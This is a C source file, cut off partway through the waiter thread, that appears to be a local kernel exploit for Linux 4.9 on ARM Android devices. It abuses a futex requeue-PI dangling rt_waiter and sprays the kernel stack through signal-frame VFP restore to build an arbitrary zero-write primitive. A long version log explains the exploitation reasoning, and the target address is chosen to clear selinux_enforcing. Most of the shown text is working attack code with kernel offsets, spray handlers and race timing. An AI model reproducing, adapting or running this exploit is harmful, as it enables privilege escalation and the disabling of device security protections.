/* ghost24.c - GhostLock port for Linux 4.9.118 (32-bit armv8l userspace)
 *
 * ============ v10 (g23) -> v11: two new instruments (echo + offset scan) ============
 *
 * [the v10 conclusion was disproved by measurement]
 *   g23 (request/response protocol, spray->hit window ~1-3us) was run for 64 real
 *   rounds plus 400 walk rounds: the chain was never entered.
 *   The g22 binary (the only version that ever succeeded once, spray->hit window
 *   ~10-30us) was then re-run for 200 rounds: also never entered the chain.
 *   => the single hit at 11:19 was a ~1/600 fluke, not a stable capability.
 *   So the v10 assumption "shrinking the window to microseconds gives a stable hit"
 *   is wrong and has to be re-derived.
 *
 * [why "did not enter the chain" is the only observable]
 *   rt_mutex_adjust_pi has two gates:
 *     1141  if (!waiter || (waiter->prio == task->prio && !dl_prio(task->prio)))
 *               return;
 *     611   if (waiter->prio == task->prio) -> requeue = false (skips [7])
 *   task->prio is pinned at 120 by PI inheritance (top_pi_waiter(W) is the owner
 *   blocked on f_pi_chain, prio 120). The leftover waiter->prio on the stack was
 *   written by task_blocks_on_rt_mutex:977 with the task->prio of that moment,
 *   which is *also* 120.
 *   => spray missed = 120 == 120 = clean early return: no crash, no write, no
 *      signal at all.
 *      spray landed = 121/139 != 120 = enters [7] = walk can read it, a real run
 *      writes 0x590.
 *   So walk hit rate == spray landing rate. That is a very clean criterion.
 *
 * [the question this round must answer: where does the copy actually land]
 *   echo probe: the handler writes 0xD00D0000|seq into uc+0x0F0 (= d0, a path
 *     already proven by fpcheck), and the waiter does `vstr d0` to the global
 *     g_echo *immediately* after raise() returns.
 *     Equality => the VFP copy really happened this round and carries this
 *     round's seq (not a leftover from the previous round).
 *   --scan: rotate the candidate start offset g_ucoff of the whole rt_waiter
 *     block over [0x0F8,0x198] in steps of 8. If the derived 0x108 is off by
 *     8 bytes, some other offset will hit.
 *     (0x0F0 is reserved for the echo slot and therefore not scanned; drop the
 *     echo and try it separately if ever needed.)
 *   Both only write into our own page: zero kernel risk.
 *
 * ============ v9 (g22) -> v10: root-cause corrections ============
 *
 * [root cause: the spray is flushed by the timer tick - but the offender is main, not the waiter]
 *   The v7 comment said "no syscall at all after spray" and made the waiter use
 *   only userspace atomics after raise. The real problem is on the main side:
 *       waiter: raise -> spray lands on stack -> g_fresh++ -> spin for ack
 *       main  : usleep(1000) polling stage_done        <- up to 1ms
 *       main  : logf("stage_done=...")                 <- open/write/fsync to
 *                                                        /sdcard, milliseconds
 *       main  : read_prio(tid)                         <- 3 syscalls
 *       main  : do_nudge -> rt_mutex_adjust_pi
 *   arm64 4.9 has no separate IRQ stack, so the timer interrupt pushes straight
 *   onto the *kernel stack* of the interrupted task. While the waiter spins on
 *   CPU0, one tick every ~4ms wipes the freshly sprayed rt_waiter in
 *   [S-0x290,S-0x190). The millisecond-scale delay in main is guaranteed to be
 *   hit by a tick.
 *
 *   Evidence chain (all confirmed this round):
 *     - geometry is airtight: compat_sys_futex(0x80)->do_futex(0x130)
 *       ->futex_wait_requeue_pi.constprop.19(0x190) => rt_waiter=S-0x278;
 *       compat_sys_rt_sigreturn(0x20)->compat_restore_sigframe(0x40)
 *       ->compat_restore_vfp_context(0x230+0x20) => copy window [S-0x290,S-0x190)
 *       (all six prologue sizes re-verified one by one against vmlinux.elf)
 *     - pi_blocked_on is indeed dangling: the EDEADLK path of futex_requeue only
 *       does `this->pi_state=NULL; break;`; after W times out,
 *       handle_early_requeue_pi_wakeup returns -ETIMEDOUT because
 *       !match_futex(&q.key,key2) and jumps straight to out_put_keys, so
 *       **rt_mutex_finish_proxy_lock / remove_waiter never run**
 *     - rt_mutex_adjust_pi is indeed reached: __sched_setscheduler+0x2c4
 *       `cbnz w26 -> rt_mutex_adjust_pi`, with no oldprio comparison in between
 *     - so the only remaining explanation is "the spray did not land on rt_waiter"
 *
 * [* side note: this also explains v9's "prio 20->20" mystery - sched_setattr was fine]
 *   The waiter holds f_pi_chain while the owner is blocked on f_pi_chain (prio
 *   120), so rt_mutex_getprio(W) = min(W->normal_prio, top_pi_waiter->prio)
 *   = min(?,120). In __sched_setscheduler, p->prio = rt_mutex_get_effective_prio(...)
 *   (+0x0224 `str w0,[x25,#0x68]`), so raising nice only lifts normal_prio and
 *   p->prio stays 120. probe/nudge4 already measured that sched_setattr works in
 *   all four states (self / pause / PI-blocked / spinning) with 20->25, so the
 *   interface itself is fine.
 *
 * [what v10 changes]
 *   1) handshake becomes request/response: main writes g_req, the waiter raises
 *      only when it sees one, publishes g_served after spraying, and main spins
 *      purely in userspace and calls sched_setattr the moment it sees it.
 *      Only one spin check plus one syscall remain between spray and hit (~1us).
 *   2) no more read_prio / logf inside the critical section; probing and logging
 *      move after g_ack.
 *   3) walk self-proof runs 400 rounds (each round re-sprays); stop on hit. The
 *      real target only gets one round.
 *   4) the three threads are pinned to CPU0/1/2.
 *
 * ============ v8 (g21) -> v9: root-cause corrections ============
 *
 * [root cause A: wrong write site - [11] branch 1 is conditional, [7] is unconditional]
 *   v4.9 source rtmutex49.c:1152
 *       rt_mutex_adjust_prio_chain(task, RT_MUTEX_MIN_CHAINWALK, NULL,
 *                                  next_lock, NULL, task);
 *   => orig_waiter = NULL, orig_lock = NULL, top_task = task
 *   so top_waiter = orig_waiter = NULL inside the chain and the
 *   "task_has_pi_waiters()/top_waiter" gate at source line 587 never executes;
 *   the `waiter->prio == task->prio` check at line 611 is the real first gate
 *   (stage A dies right there).
 *
 *   [7] (source 705-708) is unconditional:
 *       rt_mutex_dequeue(lock, waiter);   <- rb_erase_cached(&waiter->tree_entry, ...)
 *       waiter->prio = task->prio;
 *       rt_mutex_enqueue(lock, waiter);
 *   and of the three branches of [11] (source 738-770), branch 1 and branch 2
 *   that v8 relied on require a specific equality between prerequeue_top_waiter
 *   and waiter. Our fake top waiter is built in our own page and can never equal
 *   the sprayed waiter on the stack, so **measurement lands in branch 3 (do
 *   nothing)**. v9 moves the write primitive onto the dequeue in [7].
 *
 * [root cause B: the colour bit of __rb_parent_color made ____rb_erase_color walk garbage]
 *   v8 wrote `(target-8)|1`. RB_BLACK is 1 in rbtree, so the erased node was
 *   treated as black:
 *       rebalance = __rb_is_black(pc) ? parent : NULL;
 *   -> ____rb_erase_color(target-8, root, ...) rotates/recolours .data around
 *      target as if it were an rb_node -> the write never lands and panics easily
 *      (this is exactly why the --walk run crashed the device).
 *   v9 writes `target-8` (low bit 0 = RB_RED) -> rebalance = NULL -> no rebalance.
 *
 * [root cause C: the walk sentinel was memset away by ourselves]
 *   v8 wrote 0xAAAAAAAAAAAAAAAA as a sentinel inside the walk branch, but the very
 *   next call build_fake_page() starts with memset(pg,0,4096), so the sentinel was
 *   zeroed and "read back == 0" was always true - a guaranteed false positive.
 *   v9 writes the sentinel after the page is filled.
 *
 * [v9 write primitive (write-NULL-anywhere)]
 *   Make rb_erase_cached(&waiter->tree_entry, &fake_lock->waiters) in [7] take
 *   case 1 (rb_left == NULL) of __rb_erase_augmented:
 *       pc       = target - 8      // parent = pc & ~3 = target-8; bit0=0 -> RED
 *       rb_left  = 0               // selects case 1
 *       rb_right = 0               // this is the value being written (must be 0!)
 *   then __rb_change_child(node, child=0, parent=target-8, root):
 *       parent->rb_left lives at target+8 and can never equal node (a kernel
 *       stack address), so WRITE_ONCE(parent->rb_right, 0) i.e. *(target) = 0
 *   * rb_right must be 0: in case 1 `if (child) child->__rb_parent_color = pc;`
 *     a non-zero child would dereference our value -> guaranteed panic. So this is
 *     "write 0 to an arbitrary address".
 *   * fake_lock->waiters_leftmost must != &waiter->tree_entry, otherwise
 *     rb_erase_cached calls rb_next(node) and crawls the fake tree.
 *
 * ============ v7 (g16) -> v8: two critical fixes + one self-proof probe ============
 *
 * [fix 1: no syscall at all after the spray]
 *   The waiter thread in g14/g15/g16 still called logf() (open/write/fsync) after
 *   stage_fpsimd() - the filesystem call chain has frames far deeper than 0x190:
 *     compat_SyS_write -> vfs_write -> __vfs_write -> f_op->write -> filesystem
 *     do_sys_open -> do_filp_open -> path_openat (nameidata lives on the stack, >0x200)
 *   The locals of those deep frames land exactly in [S-0x290, S-0x190) and
 *   **overwrite the rt_waiter we just sprayed**. That matches the observation
 *   "the spray offset table is correct but never takes effect".
 *   This version: install the handler before raise(); after raise() do only
 *   userspace atomic writes plus a yield spin, **no syscall whatsoever**.
 *
 * [fix 2: valid_user_regs gate (verified against v4.9 source)]
 *   In compat_restore_sigframe the VFP restore is wrapped in a double condition:
 *       err != 0  ||  !valid_user_regs(&regs->user_regs, current)  -> skip it all
 *   valid_user_regs -> valid_compat_regs requires:
 *       user_mode(pstate) && (pstate & PSR_MODE32_BIT)
 *       && !(pstate & A_BIT) && !(pstate & I_BIT) && !(pstate & F_BIT)
 *   arm_cpsr in the signal frame is written by the kernel on delivery (userspace
 *   value, A/I/F all zero), so it should pass normally. This version adds the
 *   fpcheck probe to measure it.
 *
 * [self-proof probe fpcheck]
 *   In the main thread (unrelated to the exploit):
 *     d0 = 0x0123456789ABCDEF  ->  raise(SIGUSR1)
 *     handler rewrites uc+0xF0 (= low 8 bytes of vreg0) to 0xBBBBBBBBBBBBBBBB
 *     after returning to userspace, read d0:
 *       0xBBBB... -> the VFP copy ran (gate passed, copy loop executed)
 *       0x0123... -> the VFP copy was skipped (gate failed)
 *   Because the kernel's copy destination buffer and fpsimd_update_current_state()
 *   use the same [x29+0x20, x29+0x120), hardware d0 faithfully reports whether
 *   the copy happened.
 *
 * Geometry (independently re-checked with tools/dumpfn.py + tools/find_waiter.py):
 *   compat_sys_futex(0x80) -> do_futex(0x130) -> futex_wait_requeue_pi.constprop.19(0x190)
 *     x29 = S-0x340, rt_waiter = x29+0xC8 = S-0x278
 *     (corroboration: +0x00fc str x22,[x29,#0xc8] self-reference = RB_CLEAR_NODE(tree_entry)
 *            +0x00ec add x4,x22,#0x18 / +0x0100 str x4,[x29,#0xe0] = RB_CLEAR_NODE(pi_tree)
 *            +0x0104 str xzr,[x29,#0xf8] = waiter->task = NULL
 *            q @ x29+0x118 (q.rt_waiter slot 0x170 / requeue_pi_key 0x178 / bitset 0x180)
 *            timeout @ x29+0x80, key2 @ x29+0x68, hb @ x29+0x60, canary @ 0x188)
 *   compat_sys_rt_sigreturn(0x20) -> compat_restore_sigframe(0x40)
 *       -> compat_restore_vfp_context(0x230+0x20=0x250)
 *     x29 = S-0x2B0, copy destination = [x29+0x20, x29+0x120) = [S-0x290, S-0x190)
 *     16 vregs x 16B, source = 0x100 bytes starting at uc+0xF0 (straight copy)
 *   => rt_waiter = copy window + 0x18; the handler just writes uc+0xF0+0x18+d to
 *      hit waiter+d
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/futex.h>

/* Kernel constants (from disassembly, verified on device) */
#define KIMAGE_BASE        0xffffff8008080000ULL
/* * The target must be 0x...590, not 0x...594!
 *   Layout of this stretch of .bss (confirmed by tools/xref_page.py: 19 whole-kernel
 *   references):
 *     0x...590  int   -- used as a boolean by selinux_ip_forward / ip_postroute /
 *                        socket_sock_rcv_skb / sock_rcv_skb_compat via
 *                        `ldr w1,[x,#0x590]; cbnz`
 *     0x...594  int   -- selinux_enforcing (sel_read_enforce /
 *                        sel_write_enforce / avc_denied / enforcing_setup ...)
 *     0x...598  void* -- file_security_cache (selinux_file_free_security:
 *                        `ldr x0,[x0,#0x598]; bl kmem_cache_free`)
 *   This primitive is an 8-byte write of 0 (`str x5` inside rb_erase),
 *   -> hitting 0x594 clears 0x598..0x59B as well, chopping the kmem_cache pointer
 *      to 0xffffff80_00000000, after which every close() crashes inside
 *      kmem_cache_free;
 *   -> hitting 0x590 covers exactly 0x590(int) + 0x594(selinux_enforcing), and
 *      0x598 is only *read* once as rb_erase's `parent->rb_left` for comparison.
 *   Bonus: 0x590 is 8-byte aligned, so pc = target-8 is naturally 8-aligned with
 *   bit0 = 0 (RB_RED). */
#define A_SELINUX_ENFORCE  (KIMAGE_BASE + 0x01305590ULL)
#define PAGE_OFFSET        0xffffffc000000000ULL
#define MEMSTART           0x20200000ULL

/* Struct offsets (measured from disassembly) */
#define L_WAITERS      0x08
#define L_WAITERS_LEFT 0x10
#define L_OWNER        0x18
#define W_TREE         0x00
#define W_PI_TREE      0x18
#define W_TASK         0x30
#define W_LOCK         0x38
#define W_PRIO         0x40
#define W_DEADLINE     0x48
#define T_USAGE        0x28
#define T_PRIO         0x68
#define T_NORMAL_PRIO  0x70
#define T_PI_LOCK      0x6A4
#define T_PI_WAITERS   0x6B0
#define T_PI_LEFTMOST  0x6B8
#define T_PI_BLOCKED   0x6C0

#define OFF_LOCK 0x000
#define OFF_W0   0x040
#define OFF_TASK 0x100

/* Signal-frame VFP mapping: vreg base uc+0xF0 <-> kernel stack S-0x290
 * rt_waiter = S-0x278 = (uc+0xF0)+0x18 */
#define UC_MAGIC     0x0E8
#define UC_SIZE      0x0EC
#define UC_V0_LO     0x0F0
#define UC_FPSCR     0x1F0
#define UC_COPY_END  0x1F0   /* uc+0x0F0 .. uc+0x1EF is the 0x100 bytes copied into [S-0x290,S-0x190) */

/* * v11: make "where the waiter starts inside uc" a runtime value that can be
 *   scanned. It used to be hardcoded as UC_PC=0x108 (= uc+0x0F0+0x18, derived
 *   from the [x29+0x20] base). If that derivation is off by 8 bytes the whole
 *   spray is misplaced - and when misplaced the chain just returns quietly
 *   (line 611, equal prio) with **no observable signal at all**.
 *   So --scan steps g_ucoff over [0x0F0, 0x1A0] in 8-byte steps: whichever offset
 *   hits the walk sentinel is the real base. Everything stays inside our page. */
#define UC_FIELD_PC       0x00   /* waiter+0x00 tree_entry.__rb_parent_color */
#define UC_FIELD_TREE_R   0x08   /* waiter+0x08 */
#define UC_FIELD_TREE_L   0x10   /* waiter+0x10 */
#define UC_FIELD_PI_PC    0x18   /* waiter+0x18 pi_tree.__rb_parent_color */
#define UC_FIELD_PI_R     0x20   /* waiter+0x20 */
#define UC_FIELD_PI_L     0x28   /* waiter+0x28 */
#define UC_FIELD_TASK     0x30   /* waiter+0x30 */
#define UC_FIELD_LOCK     0x38   /* waiter+0x38 */
#define UC_FIELD_PRIO     0x40   /* waiter+0x40 */
#define UC_FIELD_DEADLINE 0x48   /* waiter+0x48 */
#define UC_BASE_DEFAULT   0x108  /* derived value: window starts at uc+0x0F0, waiter at window+0x18 */
#define UC_SCAN_LO        0x0F8  /* 0x0F0 reserved for the echo slot (d0); scannable but conflicts */
#define UC_SCAN_HI        0x198  /* 0x198+0x48=0x1E0, still inside the 0x100-byte copy area */
/* * VFP read-back self-proof slot: uc+0x0F0..0x0F7 = d0 (window base, proven by fpcheck).
 *   The handler writes 0xD00D0000|seq here; the waiter does vldr/vstr on d0 right
 *   after raise() returns and publishes it.
 *   Equality => this round's VFP copy **really happened** and carries this round's
 *   seq (not a leftover). This is the only instrument that separates "copy did not
 *   happen" from "copy landed elsewhere" from "copy got flushed". */
#define UC_ECHO           0x0F0
#define ECHO_TAG          0xD00D0000u

static uint32_t f_wait, f_pi_target, f_pi_chain;
static atomic_int g_waiter_ready, g_waiter_waiting, g_owner_started;
static atomic_int g_chain_done, g_waiter_tid;
static volatile uint64_t v_pc, v_tree_r, v_tree_l, v_pi_pc, v_pi_r, v_pi_l;
static volatile uint64_t v_task, v_lock, v_prio, v_deadline;
static int safe_mode;
static int walk_mode;     /* write target points into our own page, readable from userspace -> zero-risk self-proof */
static int scan_mode;     /* * v11: step g_ucoff every round to find the waiter's real offset */
static volatile int g_ucoff = UC_BASE_DEFAULT;
static volatile int g_hcount;      /* how many times the handler ran (proves the spray is happening) */
static volatile uint32_t g_seq;    /* round counter (used by the handler to build the echo tag) */
static volatile uint64_t g_echo;   /* value the waiter reads back from d0 after raise() returns */
static volatile int g_skip_off = -1; /* scan guard: skip the field that would land on waiter->prio */
/* ** v13 [safe scan] g_fill: first fill the whole copy window [0x0F0,0x1F0) with
 *   FILL_PRIO (=120), then write the 10 fields at the candidate base.
 *
 *   Theorem: as long as base != R (R = real rt_waiter offset inside uc), the real
 *   waiter->prio (at R+0x40) reads the fill value 120, and task->prio is also 120,
 *   so the line-611 gate is **permanently closed** and the chain returns before
 *   [3] - **no matter how wrong base is, nothing crashes**.
 *   Only when base == R does base+0x40 cover R+0x40, making prio 121, opening the
 *   gate and giving a write-through.
 *
 *   This is the instrument that nails R to a single qword without any hardcoding.
 *   It has exactly one precondition: task->prio really is 120.
 *   Measured (g24.log): `[ctl] waiter tid=... [prio=20 nice=0]` => p->prio = 20+100
 *   = 120, and that value is pinned by PI inheritance (the waiter holds
 *   f_pi_chain, the owner blocks on it) so it does not drift with nice. */
static volatile int g_fill;
static volatile long g_rounds;      /* --rounds N: round count (hit rate ~1/4000, needs volume) */
static volatile int g_prioonly;   /* --prioonly: write only the single qword at B+0x40, used to locate R */
/* ** --soft: pre-fill the whole VFP copy window with a [fake lock pointer], then
 *   overlay the 10 fields at the candidate offset.
 *   Motivation (measured): in about 1/3 of processes pi_blocked_on is dangling and
 *   the spray does not land, yet the gate opens by accident and the chain reads a
 *   lock that is a [freed pi_state], so BUG_ON(w->lock != lock) in
 *   rt_mutex_top_waiter crashes on the spot (rtmutex49.c:703,
 *   PC=adjust_prio_chain+0x1cc).
 *   With the floor filled in, no matter how far the spray drifts the leftover's
 *   lock slot holds a fake lock pointer (or v_lock itself), so the chain spins
 *   inside our own page and drift degrades from "crash" to "silence". */
static volatile int g_soft;
/* * timing knobs (see the write-up): whether pi_blocked_on dangles depends on the
 *   race "is the waiter already enqueued when requeue runs".
 *   --rdelay N : sleep between ready and CMP_REQUEUE_PI in main, microseconds
 *                (default 50000)
 *   --wto N    : the waiter's WAIT_REQUEUE_PI timeout, milliseconds (default 1000) */
static volatile int g_rdelay = 50000;
static volatile int g_wto_ms = 1000;
static volatile int g_fillprio = 120;   /* --fillp N: fill value (default 120 = task->prio, safe) */
#define FILL_PRIO 120
static unsigned forced_prio;
static uint64_t g_target;
static uint64_t g_value;
static uint32_t g_fpmode;          /* 0=exploit spray, 1=fpcheck */
static volatile int g_fp_seen;     /* did the handler run at all */
static volatile int g_ack;        /* spray<->nudge acknowledgement */
/* * v10 request/response protocol
 *   The old g_fresh/g_ack pair meant "spray then wait for ack": the waiter sprayed
 *   the next batch as soon as it was released, while main spent the gap between
 *   rounds in logf(fsync)/read_prio - by the time main came back, that batch was
 *   already milliseconds old and long since flushed by timer ticks.
 *   Now: main writes g_req, the waiter raises only when it sees one, publishes
 *   g_served after spraying, and main spins purely in userspace until
 *   g_served == g_req, then calls sched_setattr immediately.
 *   That leaves only a spin check plus one syscall (~1us) between spray and hit. */
static volatile int g_req, g_served, g_spray_ready;
static int forced_nice = -999;

static int g_log_fd = -1;
static void logf(const char *fmt, ...) {
  char b[256];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(b, sizeof(b), fmt, ap);
  va_end(ap);
  if (n < 0) return;
  if (g_log_fd < 0) {
    g_log_fd = open("/data/local/tmp/g24.log",
                    O_WRONLY | O_CREAT | O_APPEND, 0644);
  }
  if (g_log_fd >= 0) {
    ssize_t w = write(g_log_fd, b, (size_t)n);
    (void)w;
    fsync(g_log_fd);
  }
}

static long futex_op(uint32_t *u, int op, uint32_t val, const void *t,
                     uint32_t *u2, uint32_t v3) {
  return syscall(SYS_futex, u, op, val, t, u2, v3);
}

static void pin_cpu(int cpu) {
  cpu_set_t s;
  CPU_ZERO(&s);
  CPU_SET(cpu, &s);
  sched_setaffinity(0, sizeof(s), &s);
}

static long do_nudge(int tid, int nice, int *errp) {
  struct {
    uint32_t size, policy;
    uint64_t flags;
    int32_t nice;
    uint32_t prio;
    uint64_t rt, dl, pd;
  } sa;
  memset(&sa, 0, sizeof(sa));
  sa.size = sizeof(sa);
  sa.policy = SCHED_OTHER;
  sa.nice = nice;
  errno = 0;
  long ret = syscall(__NR_sched_setattr, tid, &sa, 0);
  *errp = ret ? errno : 0;
  return ret;
}

static void spray_handler(int sig, siginfo_t *si, void *uc) {
  (void)sig; (void)si;
  uint8_t *p = (uint8_t *)uc;
  g_fp_seen = 1;
  if (g_prioonly) {
    /* ** locator probe (single field): write 121 into the prio slot of the
     *    candidate base and touch nothing else.
     *   miss -> the leftover rt_waiter is untouched -> waiter->prio is still 120
     *           == task->prio -> rt_mutex_adjust_pi returns at the first gate ->
     *           absolutely safe;
     *   hit  -> waiter->prio=121 != 120 -> gate opens -> the chain runs with the
     *           [real] leftover -> [4] lock = the real target rt_mutex -> ... ->
     *           [11] rt_mutex_dequeue_pi(owner, prerequeue_top_waiter=NULL) ->
     *           NULL dereference -> crash.
     *   => "crash" is the criterion for "B == R"; after reboot the last [B] line
     *      in the log is R. */
    *(uint64_t *)(p + g_ucoff + 0x40) = 121;
    *(uint32_t *)(p + UC_ECHO)     = ECHO_TAG | (g_seq & 0xFFFFu);
    *(uint32_t *)(p + UC_ECHO + 4) = 0x5EED5EEDu;
    g_hcount++;
    return;
  }
  *(uint32_t *)(p + UC_MAGIC) = 0x56465001u;
  *(uint32_t *)(p + UC_SIZE)  = 0x120u;
  if (g_fpmode) {
    /* fpcheck: only touch vreg0 (d0); whether it gets copied is up to the gate */
    *(uint64_t *)(p + UC_V0_LO) = 0xBBBBBBBBBBBBBBBBULL;
    return;
  }
  /* * v11: the whole rt_waiter is written relative to g_ucoff, so the base is
   *   scannable.
   *
   * ** scan guard rule (mandatory, otherwise it crashes):
   *   The real waiter's prio lives at window+0x148 and the line-611 gate is
   *   exactly `waiter->prio == task->prio`. If some candidate offset B writes a
   *   **different** field (v_pc / v_lock / ...) onto 0x148, the value is no longer
   *   120, the gate opens by accident, and the chain carries a half-corrupted
   *   waiter into [7] -> [11] and then rb_erases a fake tree -> panic.
   *   So: when B != 0x108, skip whichever field would land on 0x148.
   *   Zero cost - because only when the real waiter IS at 0x108 does its prio sit
   *   at 0x148; for B != 0x108 that field could never reach the real prio anyway. */
  {
    static const int foff[10] = { 0x00, 0x08, 0x10, 0x18, 0x20,
                                  0x28, 0x30, 0x38, 0x40, 0x48 };
    uint64_t fval[10];
    uint8_t *q = p + g_ucoff;
    if (g_fill || g_soft) {
      /* * safe scan: fill with 120 first, then let the fields below overwrite the
       *   0x50 bytes at the candidate base.
       *   With a wrong base the real prio falls inside the filled region = 120 =
       *   task->prio -> gate closed.
       * * --soft: the fill value becomes [fake lock pointer v_lock]. Then even if
       *   the candidate base is 8 bytes off, the leftover's lock slot holds a fake
       *   lock (not a freed pi_state) and the chain only does rb_erase /
       *   rb_insert_color inside our own page -> no crash. */
      uint64_t fv = g_soft ? (uint64_t)v_lock : (uint64_t)(uint32_t)g_fillprio;
      for (int off = UC_V0_LO; off < UC_FPSCR; off += 8)
        *(uint64_t *)(p + off) = fv;
    }
    fval[0] = v_pc;      fval[1] = v_tree_r;  fval[2] = v_tree_l;
    fval[3] = v_pi_pc;   fval[4] = v_pi_r;    fval[5] = v_pi_l;
    fval[6] = v_task;    fval[7] = v_lock;    fval[8] = v_prio;
    fval[9] = v_deadline;
    /* ** --soft: only overlay the 3 qwords the write primitive itself needs
     *   (pc / rb_right=0 / rb_left=0); everything else comes from the "fake lock
     *   pointer" fill. Reason (a measured lesson):
     *   if all 10 fields are written and the offset is 8 bytes off, v_task
     *   (kb+OFF_TASK) lands on the leftover's lock slot -> lock becomes a pointer
     *   that is readable but is not an rt_mutex -> rt_mutex_top_waiter reads
     *   leftmost=0 -> BUG_ON(w->lock!=lock) dereferences 0x38 and crashes.
     *   With only 3 overlaid: correct offset behaves exactly as before (case 1 ->
     *   write 0 to target), wrong offset leaves lock/prio/task all set to the fake
     *   lock pointer, so the chain just spins inside our own page. */
    for (int k = 0; k < (g_soft ? 3 : 10); k++) {
      if (!g_fill && g_skip_off >= 0 && foff[k] == g_skip_off) continue;  /* * guard */
      *(uint64_t *)(q + foff[k]) = fval[k];
    }
  }
  /* * echo: spray this round's sequence number into the d0 slot; the waiter reads
   *   d0 back immediately and publishes it - direct proof the copy happened */
  *(uint32_t *)(p + UC_ECHO)     = ECHO_TAG | (g_seq & 0xFFFFu);
  *(uint32_t *)(p + UC_ECHO + 4) = 0x5EED5EEDu;
  g_hcount++;
  *(uint32_t *)(p + UC_FPSCR)   = 0;
}

static int install_handler(void) {
  struct sigaction act;
  memset(&act, 0, sizeof(act));
  act.sa_sigaction = spray_handler;
  act.sa_flags = SA_SIGINFO;
  sigemptyset(&act.sa_mask);
  return sigaction(SIGUSR1, &act, NULL) == 0 ? 0 : -errno;
}

/* * self-proof probe: does the VFP copy actually run? 1=copy ran 2=skipped 0=handler never ran */
static int fpcheck_tagged(const char *tag) {
  uint64_t sentinel = 0x0123456789ABCDEFULL, out = 0;
  g_fpmode = 1;
  if (install_handler() != 0) { logf("[fp%s] sigaction failed\n", tag); g_fpmode = 0; return 0; }
  g_fp_seen = 0;
  __asm__ __volatile__("vldr d0, [%0]" :: "r"(&sentinel) : "memory");
  int r = raise(SIGUSR1);
  __asm__ __volatile__("vstr d0, [%0]" :: "r"(&out) : "memory");
  g_fpmode = 0;
  if (!g_fp_seen) {
    logf("[fp%s] FATAL: handler did not run, raise=%d\n", tag, r);
    return 0;
  } else if (out == 0xBBBBBBBBBBBBBBBBULL) {
    logf("[fp%s] OK VFP copy executed (gate passed, 0x100B copied to [S-0x290,S-0x190))\n", tag);
    return 1;
  } else if (out == 0x0123456789ABCDEFULL) {
    logf("[fp%s] NO VFP copy skipped (valid_user_regs/err gate failed) d0=%#llx\n",
         tag, (unsigned long long)out);
    return 2;
  } else {
    logf("[fp%s] ? d0=%#llx (neither sentinel nor spray value)\n",
         tag, (unsigned long long)out);
    return 0;
  }
}

static void fpcheck(void) { (void)fpcheck_tagged(""); }

/* Read task->prio of a thread (/proc/self/task/<tid>/stat field 18) */
static int read_stat(int tid, int *prio, int *nice) {
  char path[64], b[512];
  snprintf(path, sizeof(path), "/proc/self/task/%d/stat", tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) return -1;
  int n = read(fd, b, sizeof(b) - 1);
  close(fd);
  if (n <= 0) return -1;
  b[n] = 0;
  char *p = strrchr(b, ')');
  if (!p) return -1;
  p++;
  int idx = 3;
  *prio = *nice = -1;
  for (char *tok = strtok(p, " "); tok; tok = strtok(NULL, " "), idx++) {
    if (idx == 18) *prio = atoi(tok);
    if (idx == 19) *nice = atoi(tok);
  }
  return 0;
}

static int read_prio(int tid) {
  int p, n;
  return read_stat(tid, &p, &n) == 0 ? p : -1;
}

/* ===== waiter thread: not a single syscall after the spray ===== */
static void *waiter_thread(void *arg) {
  (void)arg;
  pin_cpu(0);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&g_waiter_tid, tid);
  logf("[w] start tid=%d\n", tid);

  /* the handler must be installed before the futex: no sigaction after the spray */
  if (install_handler() != 0) logf("[w] sigaction failed %d\n", errno);
  /* verify the VFP gate once on this thread too (independent of main's fpcheck) */
  logf("[w] local fp=%d (1=copy executed)\n", fpcheck_tagged("w"));

  errno = 0;
  long cr = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  logf("[w] LOCK_PI(chain) ret=%ld errno=%d\n", cr, cr ? errno : 0);
  atomic_store(&g_waiter_ready, 1);

  for (int i = 0; i < 2000 && !atomic_load(&g_owner_started); i++) usleep(1000);
  logf("[w] owner_started=%d\n", atomic_load(&g_owner_started));

  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  /* * measured (g16.log): the requeue side gets EDEADLK but the waiter is **not**
   *   woken; it returns errno=110(ETIMEDOUT) from its own absolute timeout. So the
   *   timeout value is effectively the wait duration; making it smaller speeds up
   *   iteration but it must stay above the moment requeue happens (~50ms). */
  ts.tv_sec += g_wto_ms / 1000;
  ts.tv_nsec += (long)(g_wto_ms % 1000) * 1000000L;
  if (ts.tv_nsec >= 1000000000L) { ts.tv_nsec -= 1000000000L; ts.tv_sec += 1; }
  atomic_store(&g_waiter_waiting, 1);
  errno = 0;
  long wr = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
  logf("[w] WAIT_REQUEUE_PI ret=%ld errno=%d  <-- frame popped, rt_waiter is now a stack leftover\n",
       wr, wr ? errno : 0);

  /* ** no syscall whatsoever from here on (except raise) **
   *
   * [why a spray/hit handshake]
   * arm64 4.9 has no separate IRQ stack: an EL0 interrupt pushes pt_regs(0x110)
   * onto the **kernel stack of the current task** and then runs driver frames
   * below it, easily pushing past S-0x190 and flushing the freshly sprayed
   * rt_waiter. So we cannot "spray then sleep"; instead:
   *   spray -> tell main "this batch is fresh" -> spin until main has finished
   *   sched_setattr -> spray again. That way the waiter is guaranteed **not** to
   *   be inside any syscall when main strikes, and the spray is guaranteed to be
   *   the last writer. */
  /* ** v10: request/response spraying
   *   arm64 4.9 has no separate IRQ stack, so the timer interrupt lands directly on
   *   the interrupted task's kernel stack and a single tick can flush the entire
   *   freshly sprayed rt_waiter in [S-0x290,S-0x190).
   *   So each spray batch has a shelf life of only ~4ms and main must strike
   *   within microseconds of the spray.
   *   This no longer "sprays then waits" but waits for main's request (g_req). */
  __sync_synchronize();
  g_spray_ready = 1;
  for (;;) {
    while (g_req == g_served) __asm__ __volatile__("yield" ::: "memory");
    int my = g_req;
    raise(SIGUSR1);              /* the only syscall; on return the VFP copy is on the stack */
    /* * v11: read d0 back immediately (if the copy happened, d0 = ECHO_TAG|seq) - no syscall */
    {
      uint64_t *ep = (uint64_t *)&g_echo;
      __asm__ __volatile__("vstr d0, [%0]" :: "r"(ep) : "memory");
    }
